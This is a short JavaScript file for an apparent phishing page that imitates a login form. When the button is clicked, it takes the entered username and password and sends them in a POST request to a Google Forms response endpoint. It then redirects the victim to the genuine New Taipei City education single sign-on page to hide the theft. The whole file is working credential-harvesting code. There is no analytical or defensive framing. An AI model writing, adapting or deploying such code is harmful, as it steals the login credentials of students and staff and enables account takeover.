
const button = document.getElementById("login_button")
var usr_name_Element
var usr_name
var password_Element
var password
button.addEventListener("click",login)
/*
name:entry.935037374
password:entry.2097055879
url:https://docs.google.com/forms/u/0/d/e/1FAIpQLSfRASPpQBRDHyi5BqHCUgzxPrlPgoqE7Zp7iwfV7I56Uu7Vtw/formResponse
*/
function login(){
    usr_name_Element = document.getElementById("username")
    usr_name=String(usr_name_Element.value);
    password_Element = document.getElementById("password")
    password=String(password_Element.value);
    if (usr_name.length>0 && password.length>0){
        //alert("你的帳號:"+usr_name+",你的密碼:"+password)
        var input_data = {
            "entry.935037374": usr_name,
            "entry.2097055879":password,
          };
          $.ajax({
            type: 'POST',
            url: 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSfRASPpQBRDHyi5BqHCUgzxPrlPgoqE7Zp7iwfV7I56Uu7Vtw/formResponse',
            data: input_data,
            contentType: 'application/json',
            dataType: 'jsonp',
            complete: function() {
            }
          });
        location.replace("https://sso.ntpc.edu.tw/login.aspx")
        //https://sso.ntpc.edu.tw/login.aspx
    }
    else{
        //alert("請填寫此欄位");
    }
}
